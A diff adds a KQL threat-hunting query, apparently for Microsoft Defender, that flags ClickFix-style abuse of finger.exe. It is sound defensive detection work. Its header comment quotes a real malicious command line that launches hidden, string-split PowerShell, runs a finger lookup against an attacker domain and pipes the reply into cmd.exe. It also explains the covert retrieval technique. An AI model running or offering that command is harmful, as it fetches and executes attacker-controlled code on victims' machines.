@@ -1,0 +1,30 @@
+// Hunt: ClickFix finger protocol abuse
+// Table: DeviceCustomScriptEvents
+// Source: pattern confirmed against a real detection in this tenant's
+//         AlertEvidence table (AlertId
+//         dab879c26d-f140-42c9-83bd-8a2cc293857e_1, "Suspicious
+//         'SuspClickFix' behavior was blocked"), whose command line was
+//         "cmd.exe" /c start "" /min powershell -c "& powershell
+//         ('-Windo' + 'wStyle') ('hid' + 'den') -c finger
+//         mag@finger.captchamag.com | C:\WINDOWS\system32\cmd.exe".
+// Purpose: finger.exe is a living off the land binary that performs a
+//          lookup against a remote finger server on TCP port 79, a
+//          protocol rarely monitored or blocked by modern network
+//          controls. Threat actors abuse it as a covert retrieval channel,
+//          piping the response of a finger query shaped like
+//          user@attacker-domain straight into cmd.exe or powershell for
+//          execution. None of the other hunts in this set look for finger
+//          specifically, this closes that gap.
+// Validated: success. Regex confirmed via print against the literal
+//          command text from the real detection above, correctly isolating
+//          "finger mag@finger.captchamag.com". Returned 0 rows against live
+//          SOC-Central data in the 7 day window, a clean result.
+DeviceCustomScriptEvents
+| where Timestamp > ago(7d)
+| where isnotempty(ScriptContent) or isnotempty(InitiatingProcessCommandLine)
+| extend FingerMatchScript = extract(@'(?i)\bfinger\s+[^\s]+@[^\s]+', 0, ScriptContent)
+| extend FingerMatchCmdLine = extract(@'(?i)\bfinger\s+[^\s]+@[^\s]+', 0, InitiatingProcessCommandLine)
+| where isnotempty(FingerMatchScript) or isnotempty(FingerMatchCmdLine)
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FingerMatchCmdLine, FingerMatchScript, InitiatingProcessCommandLine, RuleName
+| order by Timestamp desc
+| take 10000
